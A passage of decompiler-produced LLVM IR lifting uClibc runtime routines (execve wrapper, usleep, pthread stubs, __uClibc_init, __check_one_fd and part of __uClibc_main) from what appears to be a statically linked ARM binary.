  %v2_18248 = ptrtoint i32* %stack_var_-40 to i32
  %v2_1824c = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_1825c

dec_label_pc_1825c:                               ; preds = %dec_label_pc_1825c, %entry
  %v0_18270 = phi i32 [ 0, %entry ], [ %v1_18270, %dec_label_pc_1825c ]
  %stack_var_-36.0 = phi i32 [ %v2_1824c, %entry ], [ %v1_18264, %dec_label_pc_1825c ]
  %v1_18260 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_18260 = load i32, i32* %v1_18260, align 4
  %v1_18264 = add i32 %stack_var_-36.0, 4
  %v2_18268 = icmp eq i32 %v2_18260, 0
  %v1_18270 = add i32 %v0_18270, 1
  store i32 %v1_18270, i32* @lr, align 4
  br i1 %v2_18268, label %dec_label_pc_18278, label %dec_label_pc_1825c

dec_label_pc_18278:                               ; preds = %dec_label_pc_1825c
  %v3_18278 = mul i32 %v1_18270, 4
  %v1_1827c = add i32 %v3_18278, 18
  %v1_18280 = and i32 %v1_1827c, -8
  %v2_18284 = sub i32 %v2_18248, %v1_18280
  %v2_1828c = inttoptr i32 %v2_18284 to i32*
  store i32 %arg2, i32* %v2_1828c, align 4
  %v0_18298 = load i32, i32* @sp, align 4
  store i32 %v0_18298, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_182a0

dec_label_pc_182a0:                               ; preds = %dec_label_pc_182a0, %dec_label_pc_18278
  %v1_182b4 = phi i32 [ %v0_18298, %dec_label_pc_18278 ], [ %v5_182b4, %dec_label_pc_182a0 ]
  %stack_var_-36.1 = phi i32 [ %v2_1824c, %dec_label_pc_18278 ], [ %v1_182ac, %dec_label_pc_182a0 ]
  %v1_182a4 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_182a4 = load i32, i32* %v1_182a4, align 4
  %v0_182a8 = load i32, i32* @lr, align 4
  %v1_182a8 = add i32 %v0_182a8, -1
  store i32 %v1_182a8, i32* @lr, align 4
  %v7_182a8 = icmp eq i32 %v0_182a8, 1
  %v1_182ac = add i32 %stack_var_-36.1, 4
  %v2_182b4 = add i32 %v1_182b4, 4
  %v3_182b4 = inttoptr i32 %v2_182b4 to i32*
  store i32 %v2_182a4, i32* %v3_182b4, align 4
  %v4_182b4 = load i32, i32* %ip.global-to-local, align 4
  %v5_182b4 = add i32 %v4_182b4, 4
  store i32 %v5_182b4, i32* %ip.global-to-local, align 4
  br i1 %v7_182a8, label %dec_label_pc_182bc, label %dec_label_pc_182a0

dec_label_pc_182bc:                               ; preds = %dec_label_pc_182a0
  %v0_182c8 = call i32 @__GI_execve()
  ret i32 %v0_182c8

; uselistorder directives
  uselistorder i32 %v5_182b4, { 1, 0 }
  uselistorder i32 %v0_182a8, { 1, 0 }
  uselistorder i32 %v1_18270, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_182e8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_182f4 = udiv i32 %arg1, 1000000
  store i32 %v2_182f4, i32* %stack_var_-24, align 4
  %v2_1831c = call i32 @__libc_nanosleep(i32 %v2_182e8, i32 0)
  ret i32 %v2_1831c
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_18340 = add i32 %tmp, 4
  %v4_18340 = inttoptr i32 %v3_18340 to i32*
  store i32 %arg3, i32* %v4_18340, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1834c = icmp eq i32 %arg2, 0
  br i1 %v2_1834c, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_18358 = add i32 %tmp, 4
  %v3_18358 = inttoptr i32 %v2_18358 to i32*
  %v4_18358 = load i32, i32* %v3_18358, align 4
  store i32 %v4_18358, i32* %r0.global-to-local, align 4
  %v3_1835c = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_1835c, %bb ], [ undef, %entry ]
  %v2_18364 = xor i1 %v2_1834c, true
  call void @__pseudo_cond_branch(i1 %v2_18364, i32 %.02)
  %v1_18370 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18370

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_18398.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18374 = load i32, i32* @r4, align 4
  store i32 %v3_18374, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18398

dec_label_pc_18398:                               ; preds = %dec_label_pc_18398.dec_label_pc_18398_crit_edge, %dec_label_pc_18398.lr.ph
  %v1_18398 = phi i32 [ %v1_183a4, %dec_label_pc_18398.dec_label_pc_18398_crit_edge ], [ 0, %dec_label_pc_18398.lr.ph ]
  %v0_18398 = phi i32 [ %v0_18398.pre, %dec_label_pc_18398.dec_label_pc_18398_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -8), %dec_label_pc_18398.lr.ph ]
  %v4_18398 = mul i32 %v1_18398, 4
  %v5_18398 = add i32 %v4_18398, %v0_18398
  %v6_18398 = inttoptr i32 %v5_18398 to i32*
  %v7_18398 = load i32, i32* %v6_18398, align 4
  call void @__pseudo_branch(i32 %v7_18398)
  %v0_183a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_183a4 = add i32 %v0_183a4, -1
  store i32 %v1_183a4, i32* %r4.global-to-local, align 4
  %v2_183a4 = icmp eq i32 %v0_183a4, 0
  br i1 %v2_183a4, label %dec_label_pc_183ac, label %dec_label_pc_18398.dec_label_pc_18398_crit_edge

dec_label_pc_18398.dec_label_pc_18398_crit_edge:  ; preds = %dec_label_pc_18398
  %v0_18398.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18398

dec_label_pc_183ac:                               ; preds = %dec_label_pc_18398
  %v0_183b0.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_183b0 = add i32 %v0_183b0.pre, 26440
  %v3_183b0 = inttoptr i32 %v2_183b0 to i32*
  %v4_183b0 = load i32, i32* %v3_183b0, align 4
  %v2_183b4 = icmp eq i32 %v4_183b0, 0
  br i1 %v2_183b4, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_183ac
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_183ac, %bb
  %v2_183bc = xor i1 %v2_183b4, true
  call void @__pseudo_cond_branch(i1 %v2_183bc, i32 %v4_183b0)
  %v0_183c4 = load i32, i32* %r5.global-to-local, align 4
  %v2_183c4 = add i32 %v0_183c4, 26444
  %v3_183c4 = inttoptr i32 %v2_183c4 to i32*
  %v4_183c4 = load i32, i32* %v3_183c4, align 4
  %v2_183c8 = icmp eq i32 %v4_183c4, 0
  br i1 %v2_183c8, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_183d0 = xor i1 %v2_183c8, true
  call void @__pseudo_cond_branch(i1 %v2_183d0, i32 %v4_183c4)
  %v2_183d4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_183d4, i32* %r4.global-to-local, align 4
  %v1_183d8 = load i32, i32* @r0, align 4
  ret i32 %v1_183d8

; uselistorder directives
  uselistorder i32 %v1_183a4, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_18404 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_1840c = icmp eq i32 %v2_18404, -1
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r3, align 4
  br i1 %v3_1840c, label %dec_label_pc_18418, label %dec_label_pc_18430

dec_label_pc_18418:                               ; preds = %entry
  %v0_1841c = load i32, i32* %r5.global-to-local, align 4
  %v2_18424 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 -35280), i32 %v0_1841c)
  %v1_18428 = load i32, i32* %r4.global-to-local, align 4
  %v1_1842c = icmp ne i32 %v2_18424, %v1_18428
  call void @__pseudo_cond_branch(i1 %v1_1842c, i32 ptrtoint (i32* @global_var_17080.1085 to i32))
  br label %dec_label_pc_18430

dec_label_pc_18430:                               ; preds = %entry, %dec_label_pc_18418
  %v1_18438 = phi i32 [ %v2_18404, %entry ], [ %v2_18424, %dec_label_pc_18418 ]
  ret i32 %v1_18438

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_open, { 0, 3, 4, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_18430, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r4.global-to-local, align 4
  %v4_18454 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 96) to i32*), align 4
  %v1_18458 = inttoptr i32 %v4_18454 to i32*
  %v2_18458 = load i32, i32* %v1_18458, align 4
  %v2_1845c = icmp eq i32 %v2_18458, 0
  br i1 %v2_1845c, label %dec_label_pc_18464, label %dec_label_pc_18498

dec_label_pc_18464:                               ; preds = %entry
  %v4_18468 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 56) to i32*), align 4
  %v2_18470 = icmp eq i32 %v4_18468, 0
  store i32 4096, i32* %v1_18458, align 4
  br i1 %v2_18470, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_18464
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_18464, %bb
  %v2_1847c = xor i1 %v2_18470, true
  call void @__pseudo_cond_branch(i1 %v2_1847c, i32 %v4_18468)
  %v0_18484 = load i32, i32* %r4.global-to-local, align 4
  %v2_18484 = add i32 %v0_18484, -92096
  %v2_1848c = icmp eq i32 %v2_18484, 0
  br i1 %v2_1848c, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_18494 = xor i1 %v2_1848c, true
  call void @__pseudo_cond_branch(i1 %v2_18494, i32 %v2_18484)
  br label %dec_label_pc_18498

dec_label_pc_18498:                               ; preds = %entry, %bb6
  %v1_1849c = load i32, i32* @r0, align 4
  ret i32 %v1_1849c

; uselistorder directives
  uselistorder label %dec_label_pc_18498, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_184b8 = add i32 %tmp, 4
  store i32 %v1_184b8, i32* %ip.global-to-local, align 4
  %v2_184bc = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* @r6, align 4
  %v3_184c8 = mul i32 %arg2, 4
  store i32 %v3_184c8, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_184d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 20) to i32*), align 4
  store i32 %v4_184d0, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_184d8 = ptrtoint i32* %stack_var_-120 to i32
  %v4_184dc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 28) to i32*), align 4
  store i32 %v4_184dc, i32* %r4.global-to-local, align 4
  %v2_184e4 = add i32 %v1_184b8, %v3_184c8
  store i32 %v2_184e4, i32* %ip.global-to-local, align 4
  %v9_184e8 = icmp eq i32 %v2_184e4, %v2_184bc
  store i1 %v9_184e8, i1* %cpsr_z.global-to-local, align 1
  %v2_184ec = inttoptr i32 %v4_184d0 to i32*
  store i32 %arg7, i32* %v2_184ec, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 26444, i32* %r2.global-to-local, align 4
  %v0_184f8 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_184e8, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_184fc = load i32, i32* @r7, align 4
  %v2_184fc = load i32, i32* %r5.global-to-local, align 4
  %v3_184fc = add i32 %v2_184fc, %v1_184fc
  store i32 %v3_184fc, i32* %r3.global-to-local, align 4
  %v1_18500 = load i32, i32* @r6, align 4
  %v3_18500 = add i32 %v1_18500, 26444
  %v4_18500 = inttoptr i32 %v3_18500 to i32*
  store i32 %arg6, i32* %v4_18500, align 4
  %v0_18504 = load i32, i32* %ip.global-to-local, align 4
  %v1_18504 = load i32, i32* %r4.global-to-local, align 4
  %v2_18504 = inttoptr i32 %v1_18504 to i32*
  store i32 %v0_18504, i32* %v2_18504, align 4
  store i32 120, i32* @r2, align 4
  %v1_18510 = load i32, i32* %r3.global-to-local, align 4
  %v2_18510 = load i32, i32* %r4.global-to-local, align 4
  %v3_18510 = inttoptr i32 %v2_18510 to i32*
  store i32 %v1_18510, i32* %v3_18510, align 4
  br label %bb58

.critedge:                                        ; preds = %entry
  %v1_18500.c = load i32, i32* @r6, align 4
  %v3_18500.c = add i32 %v1_18500.c, 26444
  %v4_18500.c = inttoptr i32 %v3_18500.c to i32*
  store i32 %arg6, i32* %v4_18500.c, align 4
  %v0_18504.c = load i32, i32* %ip.global-to-local, align 4
  %v1_18504.c = load i32, i32* %r4.global-to-local, align 4
  %v2_18504.c = inttoptr i32 %v1_18504.c to i32*
  store i32 %v0_18504.c, i32* %v2_18504.c, align 4
  store i32 120, i32* @r2, align 4
  br label %bb58

bb58:                                             ; preds = %.critedge, %bb
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1851c = bitcast i32* %stack_var_-120 to i8*
  %v3_1851c = call i32 @__GI_memset(i8* %v2_1851c, i32 0)
  %v0_18520 = load i32, i32* %r4.global-to-local, align 4
  %v1_18520 = inttoptr i32 %v0_18520 to i32*
  %storemerge.pre = load i32, i32* %v1_18520, align 4
  br label %dec_label_pc_1852c

dec_label_pc_1852c:                               ; preds = %dec_label_pc_1852c, %bb58
  %storemerge = phi i32 [ %storemerge.pre, %bb58 ], [ %v4_1852c, %dec_label_pc_1852c ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1852c = inttoptr i32 %storemerge to i32*
  %v2_1852c = load i32, i32* %v1_1852c, align 4
  store i32 %v2_1852c, i32* %r3.global-to-local, align 4
  %v4_1852c = add i32 %storemerge, 4
  store i32 %v4_1852c, i32* %r2.global-to-local, align 4
  %v2_18530 = icmp eq i32 %v2_1852c, 0
  store i32 %v4_1852c, i32* %r1.global-to-local, align 4
  br i1 %v2_18530, label %dec_label_pc_1853c, label %dec_label_pc_1852c

dec_label_pc_1853c:                               ; preds = %dec_label_pc_1852c
  store i32 %v4_1852c, i32* @r4, align 4
  store i32 %v2_184d8, i32* @r5, align 4
  %v1_1856029 = inttoptr i32 %v4_1852c to i32*
  %v2_1856030 = load i32, i32* %v1_1856029, align 4
  store i32 %v2_1856030, i32* %r3.global-to-local, align 4
  %v2_1856432 = icmp eq i32 %v2_1856030, 0
  store i1 %v2_1856432, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1856432, label %dec_label_pc_1856c, label %dec_label_pc_18548

dec_label_pc_18548:                               ; preds = %dec_label_pc_1853c, %dec_label_pc_18560
  %v4_18550 = phi i32 [ %v1_1855c, %dec_label_pc_18560 ], [ %v4_1852c, %dec_label_pc_1853c ]
  %v5_1854c = phi i32 [ %v2_18560, %dec_label_pc_18560 ], [ %v2_1856030, %dec_label_pc_1853c ]
  %v2_18548 = icmp ugt i32 %v5_1854c, 13
  %v7_18548 = icmp eq i32 %v5_1854c, 14
  store i1 %v7_18548, i1* %cpsr_z.global-to-local, align 1
  %v2_1854c = xor i1 %v2_18548, true
  %v3_1854c = or i1 %v7_18548, %v2_1854c
  br i1 %v3_1854c, label %bb59, label %bb60

bb59:                                             ; preds = %dec_label_pc_18548
  %v6_1854c = and i32 %v5_1854c, 536870912
  %v7_1854c = icmp ne i32 %v6_1854c, 0
  br label %bb60

bb60:                                             ; preds = %dec_label_pc_18548, %bb59
  %v1_18558 = phi i1 [ %v2_18548, %dec_label_pc_18548 ], [ %v7_1854c, %bb59 ]
  %v2_18550 = xor i1 %v1_18558, true
  %v3_18550 = or i1 %v7_18548, %v2_18550
  br i1 %v3_18550, label %bb61, label %dec_label_pc_18560

bb61:                                             ; preds = %bb60
  store i32 %v4_18550, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18560

dec_label_pc_18560:                               ; preds = %bb60, %bb61
  call void @__pseudo_cond_branch(i1 %v3_18550, i32 ptrtoint (i32* @global_var_15270.1094 to i32))
  %v0_1855c = load i32, i32* @r4, align 4
  %v1_1855c = add i32 %v0_1855c, 8
  store i32 %v1_1855c, i32* @r4, align 4
  %v1_18560 = inttoptr i32 %v1_1855c to i32*
  %v2_18560 = load i32, i32* %v1_18560, align 4
  store i32 %v2_18560, i32* %r3.global-to-local, align 4
  %v2_18564 = icmp eq i32 %v2_18560, 0
  store i1 %v2_18564, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18564, label %dec_label_pc_1856c, label %dec_label_pc_18548

dec_label_pc_1856c:                               ; preds = %dec_label_pc_18560, %dec_label_pc_1853c
  %v1_18570 = call i32 @_dl_aux_init(i32 %v2_184d8)
  store i32 %v1_18570, i32* @r0, align 4
  %v1_18574 = call i32 @__GI___uClibc_init(i32 %v1_18570)
  store i32 %v1_18574, i32* @r0, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  store i32 %tmp54, i32* @r2, align 4
  %v0_18580 = load i32, i32* @r6, align 4
  %v2_18580 = add i32 %v0_18580, 96
  %v3_18580 = inttoptr i32 %v2_18580 to i32*
  %v4_18580 = load i32, i32* %v3_18580, align 4
  store i32 %v4_18580, i32* %r1.global-to-local, align 4
  store i32 %tmp53, i32* @r3, align 4
  %v2_18588 = icmp eq i32 %tmp54, 0
  store i1 %v2_18588, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18588, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1856c
  store i32 4096, i32* @r2, align 4
  br label %bb63

bb63:                                             ; preds = %dec_label_pc_1856c, %bb62
  %v0_18594 = phi i32 [ %tmp54, %dec_label_pc_1856c ], [ 4096, %bb62 ]
  %v3_18590 = icmp eq i32 %tmp53, -1
  %v8_18590 = icmp eq i32 %tmp53, -1
  store i1 %v8_18590, i1* %cpsr_z.global-to-local, align 1
  %v2_18594 = inttoptr i32 %v4_18580 to i32*
  store i32 %v0_18594, i32* %v2_18594, align 4
  br i1 %v3_18590, label %dec_label_pc_1859c, label %dec_label_pc_185c4

dec_label_pc_1859c:                               ; preds = %bb63
  %v0_1859c = call i32 @getuid()
  store i32 %v0_1859c, i32* @r0, align 4
  store i32 %v0_1859c, i32* @r4, align 4
  %v0_185a4 = call i32 @geteuid()
  store i32 %v0_185a4, i32* @r0, align 4
  %v0_185a8 = load i32, i32* @r4, align 4
  %v9_185a8 = icmp eq i32 %v0_185a8, %v0_185a4
  store i1 %v9_185a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_185a8, label %dec_label_pc_185b0, label %dec_label_pc_185ec

dec_label_pc_185b0:                               ; preds = %dec_label_pc_1859c
  %v1_185b0 = call i32 @getgid(i32 %v0_185a4)
  store i32 %v1_185b0, i32* @r0, align 4
  store i32 %v1_185b0, i32* @r4, align 4
  %v0_185b8 = call i32 @getegid()
  store i32 %v0_185b8, i32* @r0, align 4
  %v0_185bc = load i32, i32* @r4, align 4
  %v9_185bc = icmp eq i32 %v0_185bc, %v0_185b8
  store i1 %v9_185bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_185bc, label %dec_label_pc_185c4, label %dec_label_pc_185ec

dec_label_pc_185c4:                               ; preds = %dec_label_pc_185b0, %bb63
  store i32 %tmp53, i32* @r2, align 4
  store i1 %v8_18590, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_18590, label %dec_label_pc_18610, label %dec_label_pc_185d0

dec_label_pc_185d0:                               ; preds = %dec_label_pc_185c4
  store i32 %tmp52, i32* @r3, align 4
  %v9_185d4 = icmp eq i32 %tmp53, %tmp52
  store i1 %v9_185d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_185d4, label %dec_label_pc_185dc, label %dec_label_pc_185ec

dec_label_pc_185dc:                               ; preds = %dec_label_pc_185d0
  store i32 %tmp51, i32* @r2, align 4
  store i32 %tmp50, i32* @r3, align 4
  %v9_185e4 = icmp eq i32 %tmp51, %tmp50
  store i1 %v9_185e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_185e4, label %dec_label_pc_18610, label %dec_label_pc_185ec

dec_label_pc_185ec:                               ; preds = %dec_label_pc_185d0, %dec_label_pc_185b0, %dec_label_pc_1859c, %dec_label_pc_185dc
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_185f4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_18600 = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 32770, i32* %r1.global-to-local, align 4
  %v2_1860c = call i32 @__check_one_fd(i32 2, i32 32770)
  store i32 %v2_1860c, i32* @r0, align 4
  br label %dec_label_pc_18610

dec_label_pc_18610:                               ; preds = %dec_label_pc_185dc, %dec_label_pc_185c4, %dec_label_pc_185ec
  %v0_18610 = load i32, i32* @r7, align 4
  %v1_18610 = inttoptr i32 %v0_18610 to i32*
  %v2_18610 = load i32, i32* %v1_18610, align 4
  store i32 %v2_18610, i32* %r2.global-to-local, align 4
  store i32 1252, i32* %r3.global-to-local, align 4
  %v1_18618 = load i32, i32* @r6, align 4
  %v3_18618 = add i32 %v1_18618, 1252
  %v4_18618 = inttoptr i32 %v3_18618 to i32*
  store i32 %v2_18610, i32* %v4_18618, align 4
  %v0_1861c = load i32, i32* @r7, align 4
  %v1_1861c = inttoptr i32 %v0_1861c to i32*
  %v2_1861c = load i32, i32* %v1_1861c, align 4
  store i32 %v2_1861c, i32* @r4, align 4
  %v2_18620 = icmp eq i32 %v2_1861c, 0
  store i1 %v2_18620, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18620, label %bb65, label %dec_label_pc_18628

dec_label_pc_18628:                               ; preds = %dec_label_pc_18610
  store i32 116, i32* %r3.global-to-local, align 4
  %v0_1862c = load i32, i32* @r6, align 4
  %v2_1862c = add i32 %v0_1862c, 116
  %v3_1862c = inttoptr i32 %v2_1862c to i32*
  %v4_1862c = load i32, i32* %v3_1862c, align 4
  store i32 %v4_1862c, i32* %r3.global-to-local, align 4
  %v2_18630 = inttoptr i32 %v4_1862c to i32*
  store i32 %v2_1861c, i32* %v2_18630, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_18638 = load i32, i32* @r7, align 4
  %v1_18638 = inttoptr i32 %v0_18638 to i32*
  %v2_18638 = load i32, i32* %v1_18638, align 4
  %v4_1863c = call i32 @__GI_strrchr(i32 %v2_18638, i32 47, i32 %v2_18610, i32 %v4_1862c)
  store i32 %v4_1863c, i32* @r0, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v2_18644 = icmp eq i32 %v4_1863c, 0
  store i1 %v2_18644, i1* %cpsr_z.global-to-local, align 1
  %v0_18648 = load i32, i32* @r6, align 4
  %v2_18648 = add i32 %v0_18648, 64
  %v3_18648 = inttoptr i32 %v2_18648 to i32*
  %v4_18648 = load i32, i32* %v3_18648, align 4
  store i32 %v4_18648, i32* %r2.global-to-local, align 4
  br i1 %v2_18644, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_18628
  %v2_1865048 = inttoptr i32 %v4_18648 to i32*
  store i32 0, i32* %v2_1865048, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_18628
  %v2_1864c = add i32 %v4_1863c, 1
  store i32 %v2_1864c, i32* %r3.global-to-local, align 4
  %v2_18650 = inttoptr i32 %v4_18648 to i32*
  store i32 %v4_1863c, i32* %v2_18650, align 4
  %v1_18654 = load i32, i32* %r3.global-to-local, align 4
  %v2_18654 = load i32, i32* %r2.global-to-local, align 4
  %v3_18654 = inttoptr i32 %v2_18654 to i32*
  store i32 %v1_18654, i32* %v3_18654, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_18610
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_1866c = load i32, i32* @r6, align 4
  %v2_1866c = add i32 %v0_1866c, -12
  store i32 %v2_1866c, i32* %r8.global-to-local, align 4
  store i32 26440, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_1867c = add i32 %v0_1866c, 26440
  %v4_1867c = inttoptr i32 %v3_1867c to i32*
  store i32 %arg5, i32* %v4_1867c, align 4
  %v0_1869417 = load i32, i32* %r4.global-to-local, align 4
  %v1_1869418 = load i32, i32* %r5.global-to-local, align 4
  %v3_1869420 = icmp ult i32 %v0_1869417, %v1_1869418
  %v9_1869426 = icmp eq i32 %v0_1869417, %v1_1869418
  store i1 %v9_1869426, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1869420, label %dec_label_pc_18684, label %dec_label_pc_186c4.lr.ph

dec_label_pc_18684:                               ; preds = %dec_label_pc_18684, %bb65
  %v1_18684 = phi i32 [ %v1_18690, %dec_label_pc_18684 ], [ %v0_1869417, %bb65 ]
  %v0_18684 = load i32, i32* %r8.global-to-local, align 4
  %v4_18684 = mul i32 %v1_18684, 4
  %v5_18684 = add i32 %v4_18684, %v0_18684
  %v6_18684 = inttoptr i32 %v5_18684 to i32*
  %v7_18684 = load i32, i32* %v6_18684, align 4
  store i32 %v7_18684, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_18684)
  %v0_18690 = load i32, i32* %r4.global-to-local, align 4
  %v1_18690 = add i32 %v0_18690, 1
  store i32 %v1_18690, i32* %r4.global-to-local, align 4
  %v1_18694 = load i32, i32* %r5.global-to-local, align 4
  %v3_18694 = icmp ult i32 %v1_18690, %v1_18694
  %v9_18694 = icmp eq i32 %v1_18690, %v1_18694
  store i1 %v9_18694, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_18694, label %dec_label_pc_18684, label %dec_label_pc_186c4.lr.ph

dec_label_pc_186c4.lr.ph:                         ; preds = %dec_label_pc_18684, %bb65
  %v2_1869c = icmp eq i32 %v0_184f8, 0
  store i1 %v2_1869c, i1* %cpsr_z.global-to-local, align 1
  %v2_186a4 = xor i1 %v2_1869c, true
  call void @__pseudo_cond_branch(i1 %v2_186a4, i32 %v0_184f8)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_186b8 = load i32, i32* @r6, align 4
  %v2_186b8 = add i32 %v0_186b8, -12
  store i32 %v2_186b8, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_186c4

